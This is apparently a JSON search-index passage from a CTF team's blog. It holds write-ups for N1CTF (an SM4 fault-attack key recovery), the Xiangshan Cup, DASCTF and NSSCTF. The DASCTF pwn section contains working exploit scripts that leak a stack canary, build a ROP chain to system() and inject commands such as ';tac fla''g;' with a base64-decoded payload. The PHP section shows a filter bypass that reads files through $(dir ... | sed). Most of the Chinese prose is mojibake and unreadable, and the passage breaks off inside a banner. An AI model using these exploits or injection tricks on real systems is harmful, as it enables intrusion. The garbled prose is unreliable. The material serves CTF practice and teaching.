0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 ] Dance_Box=DB def dance(): global Dance_Box Dance_Box = Dance_Box[2:]+Dance_Box[:2] def round_key(k): ar = [SM4_BOXES_TABLE[i] for i in i2l(k)] b = l2i(ar) return b ^ rotl32(b, 13) ^ rotl32(b, 23) def expand_key(master_key): master_key = list(master_key) MK = [l2i(master_key[:4]), l2i(master_key[4:8]),\\ l2i(master_key[8:12]), l2i(master_key[12:])] k = [0]*36 k[0:4] = xor(MK, SM4_FK) for i in range(32): k[i + 4] = k[i] ^ (round_key(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ SM4_CK[i])) return k[4:] def tfunc(bk): ar = [SM4_BOXES_TABLE[i] for i in i2l(bk)] b = l2i(ar) return b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24) def invtfunc(b): b=d(b) ar=i2l(b) bk = [SM4_BOXES_TABLE.index(i) for i in ar] bk=l2i(bk) return bk def pfunc(bk): res = [] for i in range(4): sbox = Dance_Box[i] ar = [sbox[_] for _ in i2l(bk[i])] b = [rotl8(ar[i], i+3) for i in range(4)] res.append(l2i(b)) return res def invpfunc(res,D=DB): bk = [] for i in range(4): sbox = D[i] b=i2l(res[i]) ar=[rotl8(b[j], 8-(j+3)) for j in range(4)] bki=[sbox.index(_) for _ in ar] bk.append(l2i(bki)) return bk def one_round(bk, rk, dt): out = [] buf = [0]*36 buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])] for i in range(32): if dt == i: dance() buf[i+4] = buf[i] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i]) buf[i+1:i+5] = pfunc(buf[i+1:i+5]) dance() for _ in range(4): out += i2l(buf[-1-_]) return out def crypt_ecb(pt, key, dance_time=-1): pt = pad(list(pt)) rk = expand_key(key) block = [pt[_:_+16] for _ in range(0, len(pt), 16)] result = b'' for i in block: result += bytes(one_round(i, rk, dt=dance_time)) return result t=lambda b:b ^ rotl32(b, 2) ^ rotl32(b, 10) ^ rotl32(b, 18) ^ rotl32(b, 24) d=lambda b:rotl32(b,30)^rotl32(b,24)^rotl32(b,22)^rotl32(b,18)^rotl32(b,16)^rotl32(b,14)^rotl32(b,12)^rotl32(b,8)^rotl32(b,4)^rotl32(b,2)^b from random import * ct = ['e5a304ea2ffc53a1ff94337c2b2ae5368b46c6da3cc37f8438eb967b29249d4e', '6733baa353d4cfc4ff94337c58dc7fdbd6df83f4fbf6e5e838eb967b98d7e8d3', 'e77dbfe7868701fbd7072e6358dc7fdba067d296707bad1b0f4541dc98d7e8d3', '54b772d532556d5573a6ab667c9ff76857b5efc3b62130668e46a79b163138e4', '47339f6738dd9f4c9581fbd496dde76ea320d95b457e0373cddb910acc41fe35'] #for i in range(100): # a=getrandbits(32) # b=getrandbits(32) # assert(tfunc(a)^tfunc(b)==tfunc(a^b)) ct0t=bytes.fromhex(ct[0][:32]) ct0f=bytes.fromhex(ct[1][:32]) #ct1t=bytes.fromhex(ct[0][32:]) #ct1f=bytes.fromhex(ct[1][32:]) buft=[0]*36 buff=[0]*36 for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) #assert(invpfunc(buft[31:35],DB)[1:]==invpfunc(buff[31:35],WDB)[1:]) dt=i2l(d(buff[35]^buft[35])) print(dt) dt=i2l(d(buff[35])^d(buft[35])) print(dt) rkl0=[set() for i in range(4)] print((dt)) print(i2l(buff[32]^buft[32])) print(i2l(buff[33]^buft[33])) print(i2l(buff[34]^buft[34])) ict=i2l(buft[32]^buft[34]^buft[33]) icf=i2l(buff[32]^buff[34]^buff[33]) print(ict,icf) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl0[i].add(guess) print(rkl0) rkl0_1=copy(rkl0) print() #ct0t=bytes.fromhex(ct[0][:32]) #ct0f=bytes.fromhex(ct[1][:32]) ct0t=bytes.fromhex(ct[0][32:]) ct0f=bytes.fromhex(ct[1][32:]) buft=[0]*36 buff=[0]*36 for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) assert(invpfunc(buft[31:],DB)[1:]==invpfunc(buff[31:],WDB)[1:]) dt=i2l(d(buff[35]^buft[35])) rkl0=[set() for i in range(4)] print((dt)) print(i2l(buff[32]^buft[32])) print(i2l(buff[33]^buft[33])) print(i2l(buff[34]^buft[34])) ict=i2l(buft[32]^buft[34]^buft[33]) icf=i2l(buff[32]^buff[34]^buff[33]) print(ict,icf) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl0[i].add(guess) print(rkl0) rk=[] for rki in range(4): print(rki) ctt=[bytes.fromhex(ct[rki][:32]),bytes.fromhex(ct[rki][32:])] ctf=[bytes.fromhex(ct[rki+1][:32]),bytes.fromhex(ct[rki+1][32:])] buft=[0]*36 buff=[0]*36 rkl=[[set(),set()] for i in range(4)] for times in range(2): ct0t=ctt[times] ct0f=ctf[times] for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) for i in range(rki): buff[31-i] = buff[35-i] ^ tfunc(buff[34-i]^buff[33-i]^buff[32-i]^rk[i]) buff[31-i:35-i]=invpfunc(buff[31-i:35-i],WDB) buft[31-i] = buft[35-i] ^ tfunc(buft[34-i]^buft[33-i]^buft[32-i]^rk[i]) buft[31-i:35-i]=invpfunc(buft[31-i:35-i],WDB) assert(invpfunc(buft[31-rki:],DB)[1:]==invpfunc(buff[31-rki:],WDB)[1:]) ict=i2l(buft[32-rki]^buft[34-rki]^buft[33-rki]) icf=i2l(buff[32-rki]^buff[34-rki]^buff[33-rki]) dt=i2l(d(buff[35-rki]^buft[35-rki])) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl[i][times].add(guess) print(rkl) rkn=[(rkl[i][0]&rkl[i][1]) for i in range(4)] print(rkn) assert(all([len(i)==1 for i in rkn])) rkn=[list(i)[0] for i in rkn] rk.append(l2i(rkn)) print(rk[::-1]) def inv_expand_key(rk): k = [0]*36 k[-4:] = rk for i in range(32): k[-i - 5] = k[-i-1] ^ (round_key(k[-i - 2] ^ k[-i - 3] ^ k[-i -4] ^ SM4_CK[-i-1])) MK=xor(k[0:4],SM4_FK) return MK,k[4:] from Crypto.Util.number import * MK,rks=inv_expand_key(rk[::-1]) print(MK,rks) def inv_one_round(bk, rk, dt): out = [] buf = [0]*36 buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])] buf=buf[::-1] dance() for i in range(31,-1,-1): buf[i+1:i+5] = invpfunc(buf[i+1:i+5],Dance_Box) buf[i] = buf[i+4] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i]) if dt == i: dance() for _ in range(4): out += i2l(buf[_]) return out print(bytes(inv_one_round(bytes.fromhex(ct[0][:32]),rks,31))+bytes(inv_one_round(bytes.fromhex(ct[0][32:]),rks,31))) exit() for i in range(10): key=long_to_bytes(getrandbits(128)) rk=expand_key(key) ans=one_round(key,rk,31) key1=inv_one_round(ans,rk,31) print(key,key1)","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"N1CTF","slug":"N1CTF","permalink":"http://lmarch2.github.io/tags/N1CTF/"}]},{"title":"HASHTEAM2024é¦™å±±æ¯WP","slug":"HASHTEAMé¦™å±±æ¯WP","date":"2023-10-27T13:00:57.000Z","updated":"2024-02-04T06:55:26.435Z","comments":true,"path":"posts/2611e12a/","link":"","permalink":"http://lmarch2.github.io/posts/2611e12a/","excerpt":"","text":"æœ¬wpæ˜¯é˜Ÿå‹ä»¬å…±åŒåŠªåŠ›çš„ç»“æœï¼Œæ„Ÿè°¢.N1nEmAnã€HeyGapã€1cfhã€shuiã€hash_hashç­‰å¸ˆå‚…ã€‚ HASHTEAMé¦™å±±æ¯WPmiscç­¾åˆ°é¢˜å°†é¢˜ç›®æ‰€ç»™ç¼–ç ä¸¢å…¥èµ›åšå¤§å¨ï¼Œå¾—åˆ°ç±»ä¼¼å‡¯æ’’å¯†ç çš„å­—ç¬¦ä¸²ã€‚ å› ä¸ºflagæ ¼å¼ç¬¬ä¸€ä¸ªæ˜¯fï¼Œåˆ™å¯ä»¥ç¡®å®šå‡¯æ’’çš„åç§»ï¼Œå¾—åˆ°flagã€‚ webPHP_unserialize_proæŸ¥çœ‹æºç ï¼Œå¾ˆæ˜¾ç„¶å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨ã€‚ ä½†æ˜¯è¿‡æ»¤äº†f l a g * ?ï¼Œéœ€è¦ç»•è¿‡ã€‚è¿™é‡Œé¦–å…ˆä½¿ç”¨dir -1 /æŸ¥çœ‹flagä½ç½®ï¼Œå‘ç°æ˜¯åœ¨ç¬¬äº”ä¸ªã€‚ç„¶åä½¿ç”¨rev /$(dir -l / | sed -n 5p)è¯»å–flagã€‚å¾—åˆ°ä¸€ä¸ªåå‘flagã€‚ å†æ¬¡åå‘å¾—åˆ°flagã€‚ ~/ctf/match/xsb2023/web Â» rev flag N1nE@N1nEmAn flag{8bab51a8-191e-4e78-8ca4-f1fc3fb6c018} ReURLä»å“ªå„¿æ¥è¿è¡Œé¢˜ç›®æ‰€ç»™çš„é™„ä»¶ï¼Œè®¾ç½®æ–­ç‚¹åœ¨â€ou.exeâ€æ‰€åœ¨å¤„ã€‚åœ¨ç›¸åº”æ–‡ä»¶å¤¹æ‰¾åˆ°ou.exeçš„ç›¸å…³æ–‡ä»¶ï¼Œç„¶åæ‹–å…¥idaã€‚ è¿è¡Œou.exeæ–‡ä»¶ï¼Œå‘ç°åœ¨v18 += strlen(v18)å¤„ä¸‹æ–­ç‚¹ï¼Œæœç´¢flagå¯ä»¥å¾—åˆ°flagã€‚ hello pythonäº†è§£åˆ°æ˜¯pythonå†™çš„apkï¼Œå®šä½æ‰€æœ‰ä¸ç»„ä»¶æ— å…³çš„åå‘ç°app.imyæ–‡ä»¶(ç”¨zipå¯ä»¥æ‰“å¼€)ï¼Œæ‰“å¼€æ˜¯ä¸ªxxteaï¼Œç›´æ¥è§£å¯†å³å¯ã€‚ def shift(z, y, x, k, p, e): return ((((z >> 5) ^ (y < 2)) + ((y >> 3) ^ (z < 4))) ^ ((x ^ y) + (k[(p & 3) ^ e] ^ z))) def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) & 0xFFFFFFFF e = (x >> 2) & 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) & 0xFFFFFFFF z = v[n - 1] return v def decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) & 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x >> 2) & 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) & 0xFFFFFFFF y = v[0] x = (x - delta) & 0xFFFFFFFF return v c = [689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ] k = [12345678 ,12398712 ,91283904 ,12378192 ] m = (decrypt(c, k)) for i in m: print(bytes.fromhex(hex(i)[2:]).decode()[::-1], end='') --------------------------------------------------------------------","categories":[{"name":"HASHTEAM'wp","slug":"HASHTEAM-wp","permalink":"http://lmarch2.github.io/categories/HASHTEAM-wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"æ¯å­","slug":"æ¯å­","permalink":"http://lmarch2.github.io/tags/%E6%9D%AF%E5%AD%90/"}]},{"title":"DASCTF X CBCTF 2023 WP","slug":"DASCTF-X-CBCTF-2023-WP","date":"2023-10-27T12:56:45.000Z","updated":"2024-02-04T09:19:32.946Z","comments":true,"path":"posts/ec1aa757/","link":"","permalink":"http://lmarch2.github.io/posts/ec1aa757/","excerpt":"","text":"DASCTF X CBCTF 2023 WP PWNEASYBOXè¿™é¢˜ä¸€å¼€å§‹é€šè¿‡CATå‡½æ•°è¯»å‡ºcanary.txtï¼Œç„¶åæ‰¾æº¢å‡ºç‚¹æ‰¾äº†ä¸¤å°æ—¶ğŸ˜… æœ€åå‘ç°ç›´æ¥å°±æ˜¯ä¸ªwebé¢˜ï¼Œåœ¨PINGå‡½æ•°é‡Œé¢æ‰§è¡Œsystemå‡½æ•°å‘½ä»¤ ;tac flaâ€™â€™g; è¿˜æœ‰ä¸€ç§è§£æ³•æ˜¯æ ˆæº¢å‡º catCommandä¸­strcatçš„ç¬¬äºŒä¸ªå‚æ•°sæ²¡æœ‰banæ‰â€..â€ï¼Œæ‰€ä»¥å­˜åœ¨ç›®å½•ç©¿è¶Šèƒ½å¤Ÿè¯»å‰é¢initå‡½æ•°ä¸­çš„canaryæ–‡ä»¶ getsæ˜¯æŠŠv1è¿™ä¸ªfdå¯¹åº”çš„æ–‡ä»¶ä¸­çš„æ•°æ®è¯»åˆ°æ ˆä¸Šï¼Œè¯»0x200å¤§å°ï¼Œä½†å…¶å®v11è¿™ä¸ªæ•°ç»„åªæœ‰120å¤§å°ï¼Œæ‰€ä»¥å°±å¯èƒ½å­˜åœ¨æº¢å‡º from Excalibur import* import base64 contextset() #remo('node4.buuoj.cn',25365) proc('./pwn') sla(b'name:',b'a\\n') sla(b'a',b'CAT') sla(b'view:',b'../secret/canary.txt') rc() canary = (ru(b'\\n')) canary = int(canary,16) prh(canary) pop_rdi = 0x0000000000401ce3 binsh = 0x0000000000402090 ret = 0x000000000040101a system = 0x00000000004018B2 sla(b'$',b'PING') pay = b'a'*0x48+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh)+p64(system) pay = base64.b64encode(pay) py = b\";echo \"+b'\"' py += pay py += b'\" | base64 -d' sla(b\"address\",py) sla(b'$',b\"CAT\") sla(b\"view\",\"result.txt\") ia() GuestBookè¾“å…¥nameçš„æ—¶å€™æœ‰æº¢å‡ºï¼Œå¯ä»¥è¦†ç›–ä¸€ä¸ªå­—èŠ‚æ³„éœ²canaryï¼Œ æ¥ç€åœ¨strcpyä¸­æœ‰æº¢å‡ºï¼Œç›´æ¥ä¼ payloadï¼Œè¢«strcpyé‡bâ€™\\x00â€™æˆªæ–­è¿™ä¸ªé—®é¢˜å¡ä½äº†ï¼ˆé‡é›¶æˆªæ–­æ„å‘³ç€æ— æ³•ä¼ è¾“å­—ç¬¦\\x00ï¼Œç„¶è€Œcanaryä»¥\\x00ç»“å°¾ï¼‰ è°ƒè¯•è§£å†³å‘ç°åœ¨ __isoc99_scanf(â€œ%sâ€, message);è¾“å…¥å­—ç¬¦ä¸²çš„æ—¶å€™ä¼šåœ¨åé¢è¡¥é›¶ äºæ˜¯å¯ä»¥é€šè¿‡å¤šæ¬¡è¾“å…¥å…ˆè¾“å…¥è¦†ç›–è¿”å›åœ°å€å’Œcanaryé™¤å»\\x00çš„ä¸ƒä¸ªå­—ç¬¦ï¼Œå†ç»™canaryè¡¥ä¸Š\\x00 from Excalibur import* contextset() remo('node4.buuoj.cn',28227) #proc('./GuestBook') #debug('b *0x000000000040143C') sla(b'name:',b'a'*(0x17)+b'b') t1 = ru(b'\\n') pr(t1) canary0 = ru(b'How')[:-7] canary = (u64(b'\\x00'+canary0)) prh(canary) system = 0x00000000004012C3 sla(b'):',b'4') sl(cyclic(0x98)+b'a'+canary0+b'a'*8+p64(system)) sl(b'a') sl(b'a') pr(type(canary)) pay = cyclic(0x38)#+p64(canary)+b'a'*8+p64(system) sl(pay) ia() CryptoRSAæƒ³æ¢å¤p,å…³é”®åœ¨äºäºŒæ¬¡å‰©ä½™ åŠ å¯†æ˜¯ä¸€ä¸ªæ¯”ç‰¹ä¸€ä¸ªæ¯”ç‰¹åœ°åŠ å¯†,æ¢å¤æ—¶åˆ¤æ–­æ˜¯å¦ä¸ºäºŒæ¬¡å‰©ä½™å³å¯æ¢å¤ å¯¹äºqå°±æ›´ç®€å•,ç›´æ¥æ±‚å¤šé¡¹å¼çš„gcdå³å¯ ä»£ç å¦‚ä¸‹ from gmpy2 import * from Crypto.Util.number import * c = 124349762993424531697403299350944207725577290992189948388824124986066269514204313888980321088629462472088631052329128042837153718129149149661961926557818023704330462282009415874674794190206220980118413541269327644472633791532767765585035518183177197863522573410860341245613331398610013697803459403446614221369 (e1, noise1, c1) = (1743, 44560588075773853612820227436439937514195680734214431948441190347878274184937952381785302837541202705212687700521129385632776241537669208088777729355349833215443048466316517110778502508209433792603420158786772339233397583637570006255153020675167597396958251208681121668808253767520416175569161674463861719776, 65643009354198075182587766550521107063140340983433852821580802983736094225036497335607400197479623208915379722646955329855681601551282788854644359967909570360251550766970054185510197999091645907461580987639650262519866292285164258262387411847857812391136042309550813795587776534035784065962779853621152905983) (e2, noise2, c2) = (1325, 35282006599813744140721262875292395887558561517759721467291789696459426702600397172655624765281531167221787036009507833425145071265739486735993631460189629709591456017092661028839951392247601628468621576100035700437892164435424035004463142959219067199451575338270613300215815894328788753564798153516122567683, 50327632090778183759544755226710110702046850880299488259739672542025916422119065179822210884622225945376465802069464782311211031263046593145733701591371950349735709553105217501410716570601397725812709771348772095131473415552527749452347866778401205442409443726952960806789526845194216490544108773715759733714) n2 = 103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902098180199167945649526235613636163362672777298968943319216325949503045377100235181706964846408396946496139224344270391027205106691880999410424150216806861393 n1 = 65634094430927080732256164808833233563732628654160389042977689628512527168256899310662239009610512772020503283842588142453533499954947692968978190310627721338357432052800695091789711809256924541784954080619073213358228083200846540676931341013554634493581962527475555869292091755676130810562421465063412235309 str0=''#wpè£…ä¸ä¸‹è¿™ä¹ˆé•¿çš„å­—ç¬¦ #legendre_symbol(i,p) def GCD(a, b): if(b == 0): return a.monic() else: return GCD(b, a % b) F.=PolynomialRing(Zmod(n2)) f1=(x+noise1)^e1-c1 f2=(x+noise2)^e2-c2 #print(GCD(f1,f2)) q=n2-103670293685965841863872863719573676572683187403862749665555450164387906552249974071743238931253290278574192713467491802940810851806104430306195931179902084990861262304328268863425199809518254496553684067856859306280794877830073274539837451563189724268783548897996668966918676147376205691514341926655798880936 print(q) print(q.nbits()) strlist=str0.split('n') #print(strlist) intlist=[int(i) for i in strlist[:-1]] #print(intlist) p='' for i in intlist: #print('test'+p) if jacobi(i,n1)==1: p='1'+p #print(p) else: p='0'+p print(p) print(int(p,base=2)) p=int(p,base=2) print(is_prime(p)) print(ZZ(p).nbits()) n=p*q phi=(p-1)*(q-1) d=inverse_mod(65537,phi) print(long_to_bytes(int(pow(c,d,n)))) CB backpackç”±äºè¿ç»­å…­ä¸ª01ä¸²ä¸­æœ‰3ä¸ª1ï¼Œåœ¨åŸå§‹èƒŒåŒ…æ ¼çš„åŸºç¡€ä¸Šæ¯è¿ç»­å…­åˆ—æ–°å¢ä¸€åˆ—ï¼Œé™åˆ¶è¿™ä¸ªæ¡ä»¶ï¼Œæœ€ç»ˆLLLå³å¯è¿˜åŸ è„šæœ¬ä¸¢äº†XD","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"DASCTF","slug":"DASCTF","permalink":"http://lmarch2.github.io/tags/DASCTF/"}]},{"title":"NSSCTF 2nd wp","slug":"NSSCTF 2nd wp","date":"2023-08-29T16:31:50.000Z","updated":"2024-02-04T15:58:57.155Z","comments":true,"path":"posts/4b18615c/","link":"","permalink":"http://lmarch2.github.io/posts/4b18615c/","excerpt":"","text":"NSSCTF 2nd WPMISCgift_in_qrcodeimport qrcode from PIL import Image from random import randrange, getrandbits, seed import os import base64 flag = os.getenv(\"FLAG\") if flag == None: flag = \"flag{test}\" secret_seed = randrange(1, 1000) seed(secret_seed) reveal = [] for i in range(20): reveal.append(str(getrandbits(8))) target = getrandbits(8) reveal = \",\".join(reveal) img_qrcode = qrcode.make(reveal) img_qrcode = img_qrcode.crop((35, 35, img_qrcode.size[0] - 35, img_qrcode.size[1] - 35)) offset, delta, rate = 50, 3, 5 img_qrcode = img_qrcode.resize( (int(img_qrcode.size[0] / rate), int(img_qrcode.size[1] / rate)), Image.LANCZOS ) img_out = Image.new(\"RGB\", img_qrcode.size) for y in range(img_qrcode.size[1]): for x in range(img_qrcode.size[0]): pixel_qrcode = img_qrcode.getpixel((x, y)) if pixel_qrcode == 255: img_out.putpixel( (x, y), ( randrange(offset, offset + delta), randrange(offset, offset + delta), randrange(offset, offset + delta), ), ) else: img_out.putpixel( (x, y), ( randrange(offset - delta, offset), randrange(offset - delta, offset), randrange(offset - delta, offset), ), ) img_out.save(\"qrcode.png\") with open(\"qrcode.png\", \"rb\") as f: data = f.read() print(\"This my gift:\") print(base64.b64encode(data).decode(), \"\\n\") print(target) ans = input(\"What's your answer:\") if ans == str(target): print(flag) else: print(\"No no no!\") é¢˜ç›®æ‰€ç»™é™„ä»¶å†…å®¹å¦‚ä¸Š åˆ†æè¿‡åå‘ç°ç›´æ¥è¾“å…¥æ‰“å°å‡ºçš„targetå³å¯è·å¾—flag Magic Dockeré¢˜ç›®æç¤ºæ‰§è¡Œå‘½ä»¤ï¼Œdocker run randark/nssctf-round15-magic-docker æ‰§è¡Œè¿‡åå‘ç°è¦æ±‚è¾“å…¥secrect æŸ¥çœ‹dockeræ–‡ä»¶ å‘ç°appæ–‡ä»¶ä¸‹çš„miain.pyæ–‡ä»¶ä¸º import click import random import sys import os from time import sleep @click.command() @click.option('--secret',help='default=none,between 0 and 100',type=int) def func(secret): if str(secret)==str(answer): print(\"Congratulations!\") print(\"But where is your flag? (=â€µÏ‰â€²=)\") else: print(\"No! You don't know anything about docker!\") print(\"How dare you! \") BANNER=\"\"\" â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â• â•šâ•â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ•â• â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â• â•šâ•â• â•šâ•â•â•â•â•â•â•â•šâ•â• â•šâ•â•â•â•â•šâ•â•â•â•â•â• â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ 